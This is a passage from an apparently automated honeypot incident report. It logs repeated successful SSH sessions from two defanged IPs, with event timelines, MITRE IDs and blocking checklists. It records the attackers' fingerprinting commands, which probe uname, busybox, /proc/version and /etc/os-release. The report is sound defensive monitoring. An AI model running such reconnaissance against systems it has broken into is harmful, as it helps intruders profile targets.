| `2026-08-02 03:53:39` | `cowrie.log.closed` |
| `2026-08-02 03:53:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1f308d120dd

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-02 03:53 |
| **Last Seen** | 2026-08-02 03:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:53:39` | `cowrie.session.connect` |
| `2026-08-02 03:53:39` | `cowrie.client.version` |
| `2026-08-02 03:53:39` | `cowrie.client.kex` |
| `2026-08-02 03:53:39` | `cowrie.login.success` |
| `2026-08-02 03:53:41` | `cowrie.session.params` |
| `2026-08-02 03:53:41` | `cowrie.command.input` |
| `2026-08-02 03:53:41` | `cowrie.log.closed` |
| `2026-08-02 03:53:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e4a74a0ad0b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:54 |
| **Last Seen** | 2026-08-02 03:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:54:42` | `cowrie.session.connect` |
| `2026-08-02 03:54:42` | `cowrie.client.version` |
| `2026-08-02 03:54:42` | `cowrie.client.kex` |
| `2026-08-02 03:54:43` | `cowrie.login.success` |
| `2026-08-02 03:54:44` | `cowrie.session.params` |
| `2026-08-02 03:54:44` | `cowrie.command.input` |
| `2026-08-02 03:54:44` | `cowrie.command.input` |
| `2026-08-02 03:54:44` | `cowrie.command.input` |
| `2026-08-02 03:54:44` | `cowrie.command.input` |
| `2026-08-02 03:54:44` | `cowrie.command.input` |
| `2026-08-02 03:54:44` | `cowrie.command.success` |
| `2026-08-02 03:54:44` | `cowrie.command.input` |
| `2026-08-02 03:54:44` | `cowrie.command.input` |
| `2026-08-02 03:54:44` | `cowrie.command.input` |
| `2026-08-02 03:54:44` | `cowrie.command.input` |
| `2026-08-02 03:54:44` | `cowrie.log.closed` |
| `2026-08-02 03:54:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94cdffb060b2

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-02 03:55 |
| **Last Seen** | 2026-08-02 03:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:55:10` | `cowrie.session.connect` |
| `2026-08-02 03:55:10` | `cowrie.client.version` |
| `2026-08-02 03:55:10` | `cowrie.client.kex` |
| `2026-08-02 03:55:10` | `cowrie.login.success` |
| `2026-08-02 03:55:11` | `cowrie.session.params` |
| `2026-08-02 03:55:11` | `cowrie.command.input` |
| `2026-08-02 03:55:11` | `cowrie.log.closed` |
| `2026-08-02 03:55:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea9bad92e8ee

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:55 |
| **Last Seen** | 2026-08-02 03:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:55:58` | `cowrie.session.connect` |
| `2026-08-02 03:55:58` | `cowrie.client.version` |
| `2026-08-02 03:55:58` | `cowrie.client.kex` |
| `2026-08-02 03:55:59` | `cowrie.login.success` |
| `2026-08-02 03:56:00` | `cowrie.session.params` |
| `2026-08-02 03:56:00` | `cowrie.command.input` |
| `2026-08-02 03:56:00` | `cowrie.command.input` |
| `2026-08-02 03:56:00` | `cowrie.command.input` |
| `2026-08-02 03:56:00` | `cowrie.command.input` |
| `2026-08-02 03:56:00` | `cowrie.command.input` |
| `2026-08-02 03:56:00` | `cowrie.command.success` |
| `2026-08-02 03:56:00` | `cowrie.command.input` |
| `2026-08-02 03:56:00` | `cowrie.command.input` |
| `2026-08-02 03:56:00` | `cowrie.command.input` |
| `2026-08-02 03:56:00` | `cowrie.command.input` |
| `2026-08-02 03:56:00` | `cowrie.log.closed` |
| `2026-08-02 03:56:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-782892d41a95

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-02 03:56 |
| **Last Seen** | 2026-08-02 03:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:56:46` | `cowrie.session.connect` |
| `2026-08-02 03:56:46` | `cowrie.client.version` |
| `2026-08-02 03:56:47` | `cowrie.client.kex` |
| `2026-08-02 03:56:47` | `cowrie.login.success` |
| `2026-08-02 03:56:48` | `cowrie.session.params` |
| `2026-08-02 03:56:48` | `cowrie.command.input` |
| `2026-08-02 03:56:48` | `cowrie.log.closed` |
| `2026-08-02 03:56:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a29e7957112

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:57 |
| **Last Seen** | 2026-08-02 03:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:57:25` | `cowrie.session.connect` |
| `2026-08-02 03:57:25` | `cowrie.client.version` |
| `2026-08-02 03:57:25` | `cowrie.client.kex` |
| `2026-08-02 03:57:26` | `cowrie.login.success` |
| `2026-08-02 03:57:27` | `cowrie.session.params` |
| `2026-08-02 03:57:27` | `cowrie.command.input` |
| `2026-08-02 03:57:27` | `cowrie.command.input` |
| `2026-08-02 03:57:27` | `cowrie.command.input` |
| `2026-08-02 03:57:27` | `cowrie.command.input` |
| `2026-08-02 03:57:27` | `cowrie.command.input` |
| `2026-08-02 03:57:27` | `cowrie.command.success` |
| `2026-08-02 03:57:27` | `cowrie.command.input` |
| `2026-08-02 03:57:27` | `cowrie.command.input` |
| `2026-08-02 03:57:27` | `cowrie.command.input` |
| `2026-08-02 03:57:27` | `cowrie.command.input` |
| `2026-08-02 03:57:27` | `cowrie.log.closed` |
| `2026-08-02 03:57:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fa0179c3f29

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-02 03:58 |
| **Last Seen** | 2026-08-02 03:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:58:27` | `cowrie.session.connect` |
| `2026-08-02 03:58:27` | `cowrie.client.version` |
| `2026-08-02 03:58:27` | `cowrie.client.kex` |
| `2026-08-02 03:58:28` | `cowrie.login.success` |
| `2026-08-02 03:58:28` | `cowrie.session.params` |
| `2026-08-02 03:58:28` | `cowrie.command.input` |
| `2026-08-02 03:58:29` | `cowrie.log.closed` |
| `2026-08-02 03:58:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0da140d31e9

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:59 |
| **Last Seen** | 2026-08-02 03:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:59:09` | `cowrie.session.connect` |
| `2026-08-02 03:59:09` | `cowrie.client.version` |
| `2026-08-02 03:59:09` | `cowrie.client.kex` |
| `2026-08-02 03:59:09` | `cowrie.login.success` |
| `2026-08-02 03:59:10` | `cowrie.session.params` |
| `2026-08-02 03:59:10` | `cowrie.command.input` |
| `2026-08-02 03:59:10` | `cowrie.command.input` |
| `2026-08-02 03:59:10` | `cowrie.command.input` |
| `2026-08-02 03:59:10` | `cowrie.command.input` |
| `2026-08-02 03:59:10` | `cowrie.command.input` |
| `2026-08-02 03:59:10` | `cowrie.command.success` |
| `2026-08-02 03:59:10` | `cowrie.command.input` |
| `2026-08-02 03:59:10` | `cowrie.command.input` |
| `2026-08-02 03:59:10` | `cowrie.command.input` |
| `2026-08-02 03:59:10` | `cowrie.command.input` |
| `2026-08-02 03:59:10` | `cowrie.log.closed` |
| `2026-08-02 03:59:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b08c9ea8fb7d

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-02 04:00 |
| **Last Seen** | 2026-08-02 04:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:00:06` | `cowrie.session.connect` |
| `2026-08-02 04:00:06` | `cowrie.client.version` |
| `2026-08-02 04:00:06` | `cowrie.client.kex` |
| `2026-08-02 04:00:06` | `cowrie.login.success` |
| `2026-08-02 04:00:07` | `cowrie.session.params` |
| `2026-08-02 04:00:07` | `cowrie.command.input` |
| `2026-08-02 04:00:07` | `cowrie.log.closed` |
| `2026-08-02 04:00:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8a4d39a079e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:01 |
| **Last Seen** | 2026-08-02 04:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:01:11` | `cowrie.session.connect` |
| `2026-08-02 04:01:11` | `cowrie.client.version` |
| `2026-08-02 04:01:11` | `cowrie.client.kex` |
| `2026-08-02 04:01:12` | `cowrie.login.success` |
| `2026-08-02 04:01:13` | `cowrie.session.params` |
| `2026-08-02 04:01:13` | `cowrie.command.input` |
| `2026-08-02 04:01:13` | `cowrie.command.input` |
| `2026-08-02 04:01:13` | `cowrie.command.input` |
| `2026-08-02 04:01:13` | `cowrie.command.input` |
| `2026-08-02 04:01:13` | `cowrie.command.input` |
| `2026-08-02 04:01:13` | `cowrie.command.success` |
| `2026-08-02 04:01:13` | `cowrie.command.input` |
| `2026-08-02 04:01:13` | `cowrie.command.input` |
| `2026-08-02 04:01:13` | `cowrie.command.input` |
| `2026-08-02 04:01:13` | `cowrie.command.input` |
| `2026-08-02 04:01:14` | `cowrie.log.closed` |
| `2026-08-02 04:01:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f683825cb96d

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-02 04:01 |
| **Last Seen** | 2026-08-02 04:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:01:37` | `cowrie.session.connect` |
| `2026-08-02 04:01:37` | `cowrie.client.version` |
| `2026-08-02 04:01:37` | `cowrie.client.kex` |
| `2026-08-02 04:01:38` | `cowrie.login.success` |
| `2026-08-02 04:01:39` | `cowrie.session.params` |
| `2026-08-02 04:01:39` | `cowrie.command.input` |
| `2026-08-02 04:01:39` | `cowrie.log.closed` |
| `2026-08-02 04:01:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48c944a9eaed

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:02 |
| **Last Seen** | 2026-08-02 04:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:02:16` | `cowrie.session.connect` |
| `2026-08-02 04:02:16` | `cowrie.client.version` |
| `2026-08-02 04:02:16` | `cowrie.client.kex` |
| `2026-08-02 04:02:18` | `cowrie.login.success` |
| `2026-08-02 04:02:19` | `cowrie.session.params` |
| `2026-08-02 04:02:19` | `cowrie.command.input` |
| `2026-08-02 04:02:19` | `cowrie.command.input` |
| `2026-08-02 04:02:19` | `cowrie.command.input` |
| `2026-08-02 04:02:19` | `cowrie.command.input` |
| `2026-08-02 04:02:19` | `cowrie.command.input` |
| `2026-08-02 04:02:19` | `cowrie.command.success` |
| `2026-08-02 04:02:19` | `cowrie.command.input` |
| `2026-08-02 04:02:19` | `cowrie.command.input` |
| `2026-08-02 04:02:19` | `cowrie.command.input` |
| `2026-08-02 04:02:19` | `cowrie.command.input` |
| `2026-08-02 04:02:19` | `cowrie.log.closed` |
| `2026-08-02 04:02:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4d5c52f72d5

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-02 04:03 |
| **Last Seen** | 2026-08-02 04:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:03:13` | `cowrie.session.connect` |
| `2026-08-02 04:03:13` | `cowrie.client.version` |
| `2026-08-02 04:03:13` | `cowrie.client.kex` |
| `2026-08-02 04:03:13` | `cowrie.login.success` |
| `2026-08-02 04:03:14` | `cowrie.session.params` |
| `2026-08-02 04:03:14` | `cowrie.command.input` |
| `2026-08-02 04:03:14` | `cowrie.log.closed` |
| `2026-08-02 04:03:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9405f2a30dda

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:03 |
| **Last Seen** | 2026-08-02 04:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:03:20` | `cowrie.session.connect` |
| `2026-08-02 04:03:20` | `cowrie.client.version` |
| `2026-08-02 04:03:20` | `cowrie.client.kex` |
| `2026-08-02 04:03:23` | `cowrie.login.success` |
| `2026-08-02 04:03:24` | `cowrie.session.params` |
| `2026-08-02 04:03:24` | `cowrie.command.input` |
| `2026-08-02 04:03:24` | `cowrie.command.input` |
| `2026-08-02 04:03:24` | `cowrie.command.input` |
| `2026-08-02 04:03:24` | `cowrie.command.input` |
| `2026-08-02 04:03:24` | `cowrie.command.input` |
| `2026-08-02 04:03:24` | `cowrie.command.success` |
| `2026-08-02 04:03:24` | `cowrie.command.input` |
| `2026-08-02 04:03:24` | `cowrie.command.input` |
| `2026-08-02 04:03:24` | `cowrie.command.input` |
| `2026-08-02 04:03:24` | `cowrie.command.input` |
| `2026-08-02 04:03:25` | `cowrie.log.closed` |
| `2026-08-02 04:03:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa6b5428571c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:04 |
| **Last Seen** | 2026-08-02 04:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:04:21` | `cowrie.session.connect` |
| `2026-08-02 04:04:22` | `cowrie.client.version` |
| `2026-08-02 04:04:22` | `cowrie.client.kex` |
| `2026-08-02 04:04:24` | `cowrie.login.success` |
| `2026-08-02 04:04:25` | `cowrie.session.params` |
| `2026-08-02 04:04:25` | `cowrie.command.input` |
| `2026-08-02 04:04:25` | `cowrie.command.input` |
| `2026-08-02 04:04:25` | `cowrie.command.input` |
| `2026-08-02 04:04:25` | `cowrie.command.input` |
| `2026-08-02 04:04:25` | `cowrie.command.input` |
| `2026-08-02 04:04:25` | `cowrie.command.success` |
| `2026-08-02 04:04:25` | `cowrie.command.input` |
| `2026-08-02 04:04:25` | `cowrie.command.input` |
| `2026-08-02 04:04:25` | `cowrie.command.input` |
| `2026-08-02 04:04:25` | `cowrie.command.input` |
| `2026-08-02 04:04:25` | `cowrie.log.closed` |
| `2026-08-02 04:04:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1bd37e58d94

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-02 04:04 |
| **Last Seen** | 2026-08-02 04:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:04:51` | `cowrie.session.connect` |
| `2026-08-02 04:04:51` | `cowrie.client.version` |
| `2026-08-02 04:04:51` | `cowrie.client.kex` |
| `2026-08-02 04:04:51` | `cowrie.login.success` |
| `2026-08-02 04:04:52` | `cowrie.session.params` |
| `2026-08-02 04:04:52` | `cowrie.command.input` |
| `2026-08-02 04:04:52` | `cowrie.log.closed` |
| `2026-08-02 04:04:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-269825d463a6

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:05 |
| **Last Seen** | 2026-08-02 04:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
